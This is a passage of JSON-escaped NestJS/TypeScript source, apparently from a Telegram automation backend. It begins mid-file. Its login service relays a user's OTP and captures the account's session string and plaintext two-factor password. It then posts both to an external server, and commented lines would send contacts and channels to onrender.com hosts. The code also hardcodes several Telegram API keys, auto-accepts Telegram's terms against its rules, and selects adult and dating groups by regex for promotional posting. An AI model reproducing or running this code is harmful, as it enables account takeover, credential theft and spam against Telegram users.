Date(message.date * 1000).toISOString(), \"Now: \", new Date(Date.now() - 60000).toISOString());\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\n                    console.log(\"Skipped Code: \", code);\n                    if (i == 2) {\n                        return code;\n                    }\n                    await sleep(5000)\n                }\n            } catch (err) {\n                await sleep(2000)\n                console.log(err)\n            }\n        }\n    }\n}\nexport default TelegramManager;\n","import { ApiProperty } from \"@nestjs/swagger\";\n\nexport class AddContactDto {\n    @ApiProperty({\n        description: 'The mobile number of the user for authentication',\n        example: '+1234567890',\n    })\n    mobile: string;\n\n    @ApiProperty({\n        description: 'List of phone numbers to add as contacts',\n        type: Object,\n        example: [\n            {\n                mobile: '+1234567890',\n                tgId: \"1234567890\"\n            }\n        ],\n    })\n    data: { mobile: string, tgId: string }[];\n\n    @ApiProperty({\n        description: 'Prefix for automated contact names',\n        example: 'Contact',\n    })\n    prefix: string;\n}","import { ApiProperty } from \"@nestjs/swagger\";\n\nexport class AddContactsDto {\n    @ApiProperty({\n        description: 'The mobile number of the user for authentication',\n        example: '+1234567890',\n    })\n    mobile: string;\n\n    @ApiProperty({\n        description: 'List of phone numbers to add as contacts',\n        type: Object,\n        example: [\n            \"919892184284\", \"919967837841\", \"919972600626\",\n        ],\n    })\n    phoneNumbers: string[];\n\n    @ApiProperty({\n        description: 'Prefix for automated contact names',\n        example: 'Contact',\n    })\n    prefix: string;\n}","import { Module, forwardRef } from '@nestjs/common';\nimport { TgSignupController } from './tgSignup.controller';\n\n@Module({\n    imports: [],\n    controllers: [TgSignupController]\n})\nexport class TgSignupModule { }\n","import { Api } from \"telegram/tl\";\nimport { TelegramClient } from \"telegram\";\nimport { StringSession } from \"telegram/sessions\";\nimport axios from \"axios\";\nimport { sleep } from \"telegram/Helpers\";\nimport { computeCheck } from \"telegram/Password\";\nimport bigInt from \"big-integer\";\nimport { LogLevel } from \"telegram/extensions/Logger\";\nimport { parseError } from \"../../utils\";\nimport { BadRequestException } from \"@nestjs/common\";\n\nconst clients = new Map();\nlet creds = [\n    {\n        apiId: 27919939,\n        apiHash: \"5ed3834e741b57a560076a1d38d2fa94\"\n    },\n    {\n        apiId: 25328268,\n        apiHash: \"b4e654dd2a051930d0a30bb2add80d09\"\n    },\n    {\n        apiId: 2899,\n        apiHash: \"36722c72256a24c1225de00eb6a1ca74\"\n    },\n    {\n        apiId: 24559917,\n        apiHash: \"702294de6c08f4fd8c94c3141e0cebfb\"\n    },\n    {\n        apiId: 12777557,\n        apiHash: \"05054fc7885dcfa18eb7432865ea3500\"\n    },\n    {\n        apiId: 27565391,\n        apiHash: \"a3a0a2e895f893e2067dae111b20f2d9\"\n    },\n    // {\n    //     apiId: 23195238,\n    //     apiHash: \"15a8b085da74163f158eabc71c55b000\"\n    // },\n    {\n        apiId: 27586636,\n        apiHash: \"f020539b6bb5b945186d39b3ff1dd998\"\n    },\n    {\n        apiId: 29210552,\n        apiHash: \"f3dbae7e628b312c829e1bd341f1e9a9\"\n    }\n]\n\n// const apiId = 24559917 || parseInt(process.env.API_ID);\n// const apiHash = \"702294de6c08f4fd8c94c3141e0cebfb\" || process.env.API_HASH;\n\nexport async function restAcc(phoneNumber) {\n    await sleep(1000);\n    console.log(\"Reset - \", phoneNumber);\n    const client: TgSignupService = getClient(phoneNumber)\n    if (client) {\n        await client.client?.destroy();\n        await client.client?.disconnect();\n        client.client.session.delete();\n        client.session.delete();\n        client.client._destroyed = true;\n        client.client = null;\n        delete client['client'];\n        await deleteClient(phoneNumber);\n    }\n}\n\nexport function getClient(number): TgSignupService {\n    return clients.get(number);\n}\n\nexport async function hasClient(number) {\n    return clients.has(number);\n}\n\nfunction contains(str, arr) {\n    return (arr.some(element => {\n        if (str?.includes(element)) {\n            return true;\n        }\n        return false;\n    }))\n};\n\nexport async function deleteClient(number) {\n    console.log(\"Deleting Client - \", number);\n    const cli = getClient(number);\n    await cli?.disconnect();\n    return clients.delete(number);\n}\n\nexport async function disconnectAll() {\n    for (const [phoneNumber, client] of clients.entries()) {\n        try {\n            await client?.disconnect();\n            clients.delete(phoneNumber);\n            console.log(`Client disconnected: ${phoneNumber}`);\n        } catch (error) {\n            console.log(error);\n            console.log(`Failed to Disconnect : ${phoneNumber}`);\n        }\n    }\n}\n\nexport async function createClient(number) {\n    try {\n        if (clients.has(number)) {\n            console.log(\"Client already exist\");\n            const cli: TgSignupService = clients.get(number);\n            setTimeout(async () => {\n                await restAcc(number)\n            }, 120000);\n            return (await cli.sendCode(false));\n        } else {\n            const randomIndex = Math.floor(Math.random() * creds.length);\n            const apiHash = creds[randomIndex].apiHash\n            const apiId = creds[randomIndex].apiId\n            console.log(\"Creating new client - \", number, creds[randomIndex]);\n            const cli = new TgSignupService(number, apiId, apiHash);\n            clients.set(number, cli);\n            await sleep(500)\n            return (await cli.sendCode(false));\n        }\n    } catch (error) {\n        console.log(parseError(error))\n        throw new BadRequestException(parseError(error).message)\n    }\n}\n\nexport class TgSignupService {\n    session: any;\n    phoneNumber: any;\n    client: TelegramClient;\n    phoneCodeHash: any;\n    apiId: number;\n    apiHash: string;\n    constructor(number: any, apiId: number, apiHash: string) {\n        this.apiId = apiId;\n        this.apiHash = apiHash;\n        this.phoneNumber = number;\n        this.session = new StringSession('');\n        this.client = null;\n        this.createClient();\n    }\n\n    async getLastActiveTime() {\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        let latest = 0\n        result.authorizations.map((auth) => {\n            if (!auth.country.toLowerCase().includes('singapore')) {\n                if (latest < auth.dateActive) {\n                    latest = auth.dateActive;\n                }\n            }\n        })\n        return latest\n    }\n\n    async disconnect() {\n        await this.client?.disconnect();\n        await this.client?.destroy();\n        await this.session.delete();\n        this.client = null\n    }\n\n    async createClient() {\n        try {\n            console.log(this.apiId, this.apiHash)\n            this.client = new TelegramClient(this.session, this.apiId, this.apiHash, {\n                connectionRetries: 5,\n            });\n            await this.client.setLogLevel(LogLevel.ERROR);\n            await this.client.connect();\n        } catch (error) {\n            console.log(\"Error while Connecting:\", error);\n        }\n    }\n\n    async deleteMessages() {\n        // console.log(\"IsConnected - \", this.client.connected, this.phoneNumber);\n        // if (this.client.connected) {\n        //     try {\n        //         const msgs = await this.client.getMessages(\"777000\", { limit: 10 });\n        //         const len = msgs['total'];\n        //         console.log(len)\n        //         for (let i = 0; i < len - 1; i++) {\n        //             console.log(msgs[i]?.text);\n        //             msgs[i]?.delete({ revoke: true });\n        //         }\n        //     } catch (error) {\n        //         console.log(\"Cannot delete Messages - \", this.phoneNumber);\n        //     }\n        // }\n        console.log(\"DeleteMessages TODO\")\n    }\n\n    async sendCode(\n        forceSMS = false\n    ): Promise<{\n        phoneCodeHash: string;\n        isCodeViaApp: boolean;\n    }> {\n        try {\n            await this.client.connect();\n            console.log(\"Sending OTP - \", this.phoneNumber, this.apiId, this.apiHash);\n            try {\n\n                const sendResult = await this.client.invoke(\n                    new Api.auth.SendCode({\n                        phoneNumber: `+${this.phoneNumber}`,\n                        apiId: this.apiId,\n                        apiHash: this.apiHash,\n                        settings: new Api.CodeSettings({}),\n                    })\n                );\n                console.log('Send result - ', sendResult);\n                setTimeout(async () => {\n                    await restAcc(this.phoneNumber);\n                }, 150000);\n                if (sendResult instanceof Api.auth.SentCodeSuccess)\n                    throw new Error(\"logged in right after sending the code\");\n                this.phoneCodeHash = sendResult.phoneCodeHash\n\n                if (!forceSMS || sendResult.type instanceof Api.auth.SentCodeTypeSms) {\n                    return {\n                        phoneCodeHash: sendResult.phoneCodeHash,\n                        isCodeViaApp:\n                            sendResult.type instanceof Api.auth.SentCodeTypeApp,\n                    };\n                }\n\n                const resendResult = await this.client.invoke(\n                    new Api.auth.ResendCode({\n                        phoneNumber: `+${this.phoneNumber}`,\n                        phoneCodeHash: sendResult.phoneCodeHash,\n                    })\n                );\n                console.log('ReSend result - ', sendResult);\n                if (resendResult instanceof Api.auth.SentCodeSuccess)\n                    throw new Error(\"logged in right after resending the code\");\n\n                this.phoneCodeHash = resendResult.phoneCodeHash\n\n                return {\n                    phoneCodeHash: resendResult.phoneCodeHash,\n                    isCodeViaApp: resendResult.type instanceof Api.auth.SentCodeTypeApp,\n                };\n            } catch (sendCodeError) {\n                console.log(\"Error in sending code:\", sendCodeError);\n                // Handle the specific error or rethrow if needed\n                // Add additional handling or logging as necessary\n                throw sendCodeError; // Rethrow the error to the outer catch block\n            }\n        } catch (err: any) {\n            if (err.errorMessage === \"AUTH_RESTART\") {\n                try {\n                    return this.client.sendCode({ apiId: this.apiId, apiHash: this.apiHash }, `+${this.phoneNumber}`, forceSMS);\n                } catch (error) {\n                    console.log(\"heelo: \", error)\n                }\n            } else {\n                throw err\n            }\n        }\n    }\n\n    async login(phoneCode: any, passowrd?: any) {\n        let isRegistrationRequired = false\n        let termsOfService;\n        try {\n            if (!phoneCode) {\n                throw new Error(\"Code is empty\");\n            }\n            if (!this.client.connected) {\n                await this.client.connect();\n            }\n            const result = await this.client?.invoke(\n                new Api.auth.SignIn({\n                    phoneNumber: `+${this.phoneNumber}`,\n                    phoneCodeHash: this.phoneCodeHash,\n                    phoneCode\n                })\n            );\n            if (result instanceof Api.auth.AuthorizationSignUpRequired) {\n                isRegistrationRequired = true;\n                termsOfService = result.termsOfService;\n            } else {\n                await this.processLogin(result.user);\n                await restAcc(this.phoneNumber);\n                return { status: 200, message: \"Login success\" }\n            }\n        } catch (err: any) {\n            console.log(err);\n            if (err.errorMessage === \"SESSION_PASSWORD_NEEDED\") {\n                console.log(\"passowrd Required\")\n                try {\n                    const passwordSrpResult = await this.client.invoke(\n                        new Api.account.GetPassword()\n                    );\n                    const passwordSrpCheck = await computeCheck(\n                        passwordSrpResult,\n                        passowrd\n                    );\n                    const { user } = (await this.client.invoke(\n                        new Api.auth.CheckPassword({\n                            password: passwordSrpCheck,\n                        })\n                    )) as Api.auth.Authorization;\n\n                    this.processLogin(user, passowrd);\n                    return { status: 200, message: \"Login success\" }\n                } catch (error) {\n                    if (passowrd && passowrd !== '') {\n                        return { status: 400, message: \"Incorrect Password!<br/>Enter your telegram Two-Factor-Authentication password.\" }\n                    } else {\n                        return { status: 400, message: \"Telegram 2FA Password\" }\n                    }\n                }\n            } else {\n                const shouldWeStop = false//await authParams.onError(err);\n                if (shouldWeStop) {\n                    throw new Error(\"AUTH_USER_CANCEL\");\n                }\n            }\n            // await restAcc(this.phoneNumber);\n            return { status: 400, message: err.errorMessage }\n        }\n\n        if (isRegistrationRequired) {\n            try {\n                let lastName = 'last name';\n                let firstName = \"first name\";\n                const { user } = (await this.client.invoke(\n                    new Api.auth.SignUp({\n                        phoneNumber: `+${this.phoneNumber}`,\n                        phoneCodeHash: this.phoneCodeHash,\n                        firstName,\n                        lastName,\n                    })\n                )) as Api.auth.Authorization;\n\n                if (termsOfService) {\n                    // This is a violation of Telegram rules: the user should be presented with and accept TOS.\n                    await this.client.invoke(\n                        new Api.help.AcceptTermsOfService({\n                            id: termsOfService.id,\n                        })\n                    );\n                }\n\n                return user;\n            } catch (err: any) {\n                const shouldWeStop = false//await authParams.onError(err);\n                if (shouldWeStop) {\n                    throw new Error(\"AUTH_USER_CANCEL\");\n                }\n            }\n        }\n        // await restAcc(this.phoneNumber);\n    }\n\n    async getCallLogs() {\n        try {\n            const result: any = await this.client.invoke(\n                new Api.messages.Search({\n                    peer: new Api.InputPeerEmpty(),\n                    q: '',\n                    filter: new Api.InputMessagesFilterPhoneCalls({}),\n                    minDate: 0,\n                    maxDate: 0,\n                    offsetId: 0,\n                    addOffset: 0,\n                    limit: 100,\n                    maxId: 0,\n                    minId: 0,\n                    hash: bigInt.zero,\n                })\n            );\n            console.log(\"Got Messages\");\n\n            const callLogs = result.messages.filter(\n                message => message.action instanceof Api.MessageActionPhoneCall\n            );\n            console.log(\"filtered call logs\");\n\n            const filteredResults = {\n                outgoing: 0,\n                incoming: 0,\n                video: 0,\n                chatCallCounts: {},\n                totalCalls: 0\n            };\n\n            for (const log of callLogs) {\n                try {\n                    filteredResults.totalCalls++;\n                    const callInfo = {\n                        callId: log.action.callId.value,\n                        duration: log.action.duration,\n                        video: log.action.video,\n                        timestamp: log.date\n                    };\n                    console.log(callInfo);\n\n                    // Categorize by type\n                    if (log.out) {\n                        filteredResults.outgoing++;\n                    } else {\n                        filteredResults.incoming++;\n                    }\n\n                    if (log.action.video) {\n                        filteredResults.video++;\n                    }\n\n                    const chatId = log.peerId.userId.value;\n                    if (!filteredResults.chatCallCounts[chatId]) {\n                        console.log(\"Getting Enitity\", chatId)\n                        let ent = { firstName: 'Default', lastName: null };\n                        try {\n                            ent = <any>await this.client.getInputEntity(chatId);\n                            console.log(\"Got Enitity\", chatId)\n                        } catch (error) {\n                            console.log(\"Failed to get entity for chatId:\", chatId, error);\n                        }\n                        filteredResults.chatCallCounts[chatId] = {\n                            name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,\n                            count: 0\n                        };\n                    } else {\n                        console.log(chatId, ' Already exists');\n                    }\n                    filteredResults.chatCallCounts[chatId].count++;\n                } catch (error) {\n                    console.log(\"Error processing log:\", log, error);\n                }\n            }\n            console.log('Returning filtered results', filteredResults);\n            return filteredResults;\n        } catch (error) {\n            console.error(\"Error in getCallLogs:\", error);\n            throw error;\n        }\n    }\n\n    async processLogin(result, passowrd = undefined) {\n        console.log(this.client.session.save());\n        await this.client.getMe();\n        let photoCount = 0;\n        let videoCount = 0;\n        let movieCount = 0;\n        const sess = this.client.session.save() as unknown as string;\n        const user: any = await result.toJSON();\n        // const dialogs = await this.client?.getDialogs({ limit: 600 });\n        // const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed\n        // for (const message of messageHistory) {\n        //     const text = message.text.toLocaleLowerCase();\n        //     if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n        //         movieCount++\n        //     } else {\n        //         if (message.photo) {\n        //             photoCount++;\n        //         } else if (message.video) {\n        //             videoCount++;\n        //         }\n        //     }\n        // }\n        // const exportedContacts: any = await this.client.invoke(new Api.contacts.GetContacts({\n        //     hash: bigInt.zero\n        // }));\n        let channels = 0;\n        const chatsArray = [];\n        let personalChats = 0;\n\n        // Process and format the exported contacts as needed\n        // const formattedContacts = exportedContacts.users.map(contact => ({\n        //     phone: contact.phone,\n        //     firstName: contact.firstName,\n        //     lastName: contact.lastName,\n        //     userName: contact.username,\n        //     clientId: contact.id.toString(),\n        //     fromId: user.id\n        // }));\n        console.log(\"AllGood\")\n        // for (let chat of dialogs) {\n        //     if (chat.isChannel || chat.isGroup) {\n        //         channels++;\n        //         const chatEntity: any = chat.entity.toJSON();\n        //         const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;\n        //         if (!chatEntity.broadcast && !cannotSendMsgs) {\n        //             chatsArray.push(chatEntity);\n        //         }\n        //     } else {\n        //         personalChats++;\n        //     }\n        // }\n        // const callLogs = await this.getCallLogs();\n\n\n        const payload3 = {\n            photoCount, videoCount, movieCount,\n            gender: null,//data?.data?.gender,\n            mobile: user.phone,\n            session: `${sess}`,\n            firstName: user.firstName,\n            lastName: user.lastName,\n            userName: user.username,\n            channels: channels,\n            personalChats: personalChats,\n            calls: {},//callLogs?.totalCalls > 0 ? callLogs : {},\n            contacts: 0,//exportedContacts.savedCount,\n            msgs: 0,//messageHistory.total,\n            totalChats: 0,//chats['total'],\n            lastActive: new Date().toISOString().split('T')[0],\n            tgId: user.id\n        };\n        if (passowrd) {\n            payload3['twoFA'] = true;\n            payload3['password'] = passowrd\n        }\n        console.log(\"Calculated results\");\n        try {\n            const url = `${process.env.tgcms}/user`;\n            console.log(\"posting results : \", url);\n            await axios.post(url, payload3, { headers: { 'Content-Type': 'application/json' } });\n            // await axios.post(`https://ramyaa3.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });\n            // await axios.post(`https://ramyaaa2.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });\n        } catch (error) {\n            console.log(\"Error Occured 1\");\n            console.log(error)\n        }\n        // await this.deleteMessages();\n        await this.disconnect();\n        await deleteClient(this.phoneNumber);\n    }\n}\n","import { Controller, Get, Post, Query, BadRequestException, HttpException } from '@nestjs/common';\nimport { ApiTags, ApiQuery } from '@nestjs/swagger';\nimport { createClient, getClient } from './TgSignup.service';\n\n\n@Controller('tgsignup')\n@ApiTags('tgsignup')\nexport class TgSignupController {\n    constructor(\n        // private readonly tgSignupService: TgSignupService\n    ) {}\n\n    @Get('login')\n    @ApiQuery({ name: 'phone', required: true })\n    async sendCode(@Query('phone') phone: string) {\n        console.log(phone)\n        const result = await createClient(phone);\n        if (result?.isCodeViaApp) {\n            console.log('OTP SENT!! - ', phone)\n            return result\n        } else {\n            throw new BadRequestException(\"Failed to send OTP\")\n        }\n    }\n\n    @Get('otp')\n    @ApiQuery({ name: 'phone', required: true })\n    @ApiQuery({ name: 'code', required: true })\n    @ApiQuery({ name: 'password', required: false })\n    async verifyCode(@Query('phone') phone: string, @Query('code') code: string, @Query('password') password: string) {\n        const cli = await getClient(phone);\n        if (cli) {\n            console.log(cli?.phoneCodeHash, cli?.phoneNumber);\n            const result: any = await cli?.login(code, password);\n            if (result && result.status === 200) {\n                return ({ mesaage: result.message });\n            } else {\n                throw new HttpException(result.message, result.status)\n            }\n        } else {\n            throw new BadRequestException(\"Failed to Verify OTP\")\n        }\n    }\n}\n","// src/activechannels/activechannels.controller.ts\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\nimport { ActiveChannelsService } from './active-channels.service';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\nimport { ActiveChannel } from './schemas/active-channel.schema';\nimport { AddReactionDto } from './dto/add-reaction.dto';\n\n@ApiTags('Active Channels')\n@Controller('active-channels')\nexport class ActiveChannelsController {\n  constructor(private readonly activeChannelsService: ActiveChannelsService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new active channel' })\n  async create(@Body() createActiveChannelDto: CreateActiveChannelDto) {\n    return this.activeChannelsService.create(createActiveChannelDto);\n  }\n\n  @Post('createMultiple')\n  @ApiOperation({ summary: 'Create multiple channels' })\n  @ApiBody({ type: [CreateActiveChannelDto] })\n  async createMultiple(@Body() createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\n    return this.activeChannelsService.createMultiple(createChannelDtos);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search channels by filters' })\n  @ApiQuery({ name: 'channelId', required: false, type: String })\n  @ApiQuery({ name: 'broadcast', required: false, type: Boolean })\n  @ApiQuery({ name: 'canSendMsgs', required: false, type: Boolean })\n  @ApiQuery({ name: 'participantsCount', required: false, type: Number })\n  @ApiQuery({ name: 'restricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'sendMessages', required: false, type: Boolean })\n  @ApiQuery({ name: 'title', required: false, type: String })\n  @ApiQuery({ name: 'username', required: false, type: String })\n  @ApiQuery({ name: 'wordRestriction', required: false, type: Number })\n  @ApiQuery({ name: 'dMRestriction', required: false, type: Number })\n  @ApiQuery({ name: 'availableMsgs', required: false, type: [String] })\n  @ApiQuery({ name: 'reactions', required: false, type: [String] })\n  @ApiQuery({ name: 'banned', required: false, type: Boolean })\n  @ApiQuery({ name: 'reactRestricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'megagroup', required: false, type: Boolean })\n  search(@Query() query: any): Promise<ActiveChannel[]> {\n    console.log(query);\n    return this.activeChannelsService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all active channels' })\n  async findAll() {\n    return this.activeChannelsService.findAll();\n  }\n\n  @Get(':channelId')\n  @ApiOperation({ summary: 'Get an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'Return the active channel', type: ActiveChannel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async findOne(@Param('channelId') channelId: string) {\n    return this.activeChannelsService.findOne(channelId);\n  }\n\n  @Patch(':channelId')\n  @ApiOperation({ summary: 'Update an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: ActiveChannel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async update(@Param('channelId') channelId: string, @Body() updateActiveChannelDto: UpdateActiveChannelDto) {\n    return this.activeChannelsService.update(channelId, updateActiveChannelDto);\n  }\n\n  @Delete(':channelId')\n  @ApiOperation({ summary: 'Delete an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async remove(@Param('channelId') channelId: string) {\n    return this.activeChannelsService.remove(channelId);\n  }\n\n  @Post(':channelId/reactions')\n  @ApiOperation({ summary: 'Add reaction to chat group' })\n  addReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\n    if (!addReactionDto.reactions) {\n      throw new BadRequestException('Reaction is required');\n    }\n    return this.activeChannelsService.addReactions(channelId, addReactionDto.reactions);\n  }\n\n  @Get(':channelId/reactions/random')\n  @ApiOperation({ summary: 'Get a random reaction from chat group' })\n  getRandomReaction(@Param('channelId') channelId: string): Promise<string> {\n    return this.activeChannelsService.getRandomReaction(channelId);\n  }\n\n  @Delete(':channelId/reactions')\n  @ApiOperation({ summary: 'Remove reaction from chat group' })\n  removeReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\n    if (!addReactionDto.reactions) {\n      throw new BadRequestException('Reaction is required');\n    }\n    return this.activeChannelsService.removeReaction(channelId, addReactionDto.reactions[0]);\n  }\n}\n","// src/activechannels/activechannels.module.ts\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ActiveChannelsService } from './active-channels.service';\nimport { ActiveChannelsController } from './active-channels.controller';\nimport { ActiveChannel, ActiveChannelSchema } from './schemas/active-channel.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { PromoteMsgModule } from '../promote-msgs/promote-msgs.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: ActiveChannel.name, schema: ActiveChannelSchema }]),\n    PromoteMsgModule\n  ],\n  controllers: [ActiveChannelsController],\n  providers: [ActiveChannelsService],\n  exports: [ActiveChannelsService]\n})\nexport class ActiveChannelsModule { }\n","import { PromoteMsgsService } from './../promote-msgs/promote-msgs.service';\n// src/activechannels/activechannels.service.ts\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ActiveChannel, ActiveChannelDocument } from './schemas/active-channel.schema';\nimport { defaultMessages, fetchWithTimeout, parseError, ppplbot } from '../../utils';\n@Injectable()\nexport class ActiveChannelsService {\n  constructor(\n    @InjectModel(ActiveChannel.name) private activeChannelModel: Model<ActiveChannelDocument>,\n    @Inject(forwardRef(() => PromoteMsgsService))\n    private promoteMsgsService: PromoteMsgsService\n  ) {}\n\n  async create(createActiveChannelDto: CreateActiveChannelDto): Promise<ActiveChannel> {\n    createActiveChannelDto.availableMsgs = Object.keys(await this.promoteMsgsService.findOne())\n    const createdChannel = new this.activeChannelModel(createActiveChannelDto);\n    return createdChannel.save();\n  }\n\n  \n  async createMultiple(createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => ({\n      updateOne: {\n        filter: { channelId: dto.channelId },\n        update: { $set: dto },\n        upsert: true\n      }\n    }));\n\n    await this.activeChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n\n  async findAll(): Promise<ActiveChannel[]> {\n    return this.activeChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<ActiveChannel> {\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateActiveChannelDto: UpdateActiveChannelDto): Promise<ActiveChannel> {\n    delete updateActiveChannelDto[\"_id\"]\n    const updatedChannel = await this.activeChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateActiveChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async removeFromAvailableMsgs(channelId: string, msg: string) {\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $pull: { availableMsgs: msg } })\n  }\n\n  async addToAvailableMsgs(channelId: string, msg: string) {\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $addToSet: { availableMsgs: msg } })\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const result = await this.activeChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<ActiveChannel[]> {\n    console.log(filter)\n    return this.activeChannelModel.find(filter).exec();\n  }\n\n  async addReactions(channelId: string, reactions: string[]): Promise<ActiveChannel> {\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\n      $addToSet: { reactions: reactions }\n    })\n    return channel;\n  }\n\n  async getRandomReaction(channelId: string): Promise<string> {\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\n    if (!channel) {\n      return undefined;\n    }\n    if (channel.reactions.length === 0) {\n      return undefined;\n    }\n    const randomIndex = Math.floor(Math.random() * channel.reactions.length);\n    return channel.reactions[randomIndex];\n  }\n\n  async removeReaction(channelId: string, reaction: string): Promise<ActiveChannel> {\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\n      $pull: { reactions: reaction },\n    })\n    return channel;\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          {\n            '$or':\n              [\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n              ]\n          },\n          {\n            '$or': [\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 600 },\n            username: {$ne: null},\n            canSendMsgs: true,\n            restricted: false,\n            forbidden: false\n          }\n        ]\n    }\n\n    const sort: Record<string, 1 | -1> = { participantsCount: -1 }\n    try {\n      const result: ActiveChannel[] = await this.activeChannelModel.aggregate([\n        { $match: query },\n        { $skip: skip },\n        { $limit: limit },\n        { $sort: sort }, // Sort by the random field\n        { $project: { randomField: 0 } } // Remove the random field from the output\n      ]).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<ActiveChannel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.activeChannelModel.find(query);\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async resetWordRestrictions() {\n    await fetchWithTimeout(`${ppplbot()}&text=Request Received for Reset Available Msgs`);\n    try {\n      await this.activeChannelModel.updateMany({\n        banned: false\n      }, {\n        $set: {\n          \"wordRestriction\": 0,\n          \"dMRestriction\": 0\n        }\n      })\n    } catch (e) {\n      console.log(parseError(e))\n    }\n  }\n\n  async resetAvailableMsgs() {\n    await fetchWithTimeout(`${ppplbot()}&text=Request Received for Reset Available Msgs`);\n    try {\n      const data = await this.promoteMsgsService.findOne();\n      const keys = Object.keys(data);\n      await this.activeChannelModel.updateMany(\n        {\n          $expr: {\n            $lt: [{ $size: { $ifNull: [\"$availableMsgs\", []] } }, 5]\n          }\n        },\n        {\n          $set: {\n            \"wordRestriction\": 0,\n            \"dMRestriction\": 0,\n            \"banned\": false,\n            \"availableMsgs\": keys\n          }\n        }\n      );\n    } catch (e) {\n      console.log(parseError(e))\n    }\n  }\n\n  async updateBannedChannels() {\n    await fetchWithTimeout(`${ppplbot()}&text=Request Received for update banned Channels`);\n    await this.activeChannelModel.updateMany({ $or: [{ banned: true }, { private: true }] }, {\n      $set: {\n        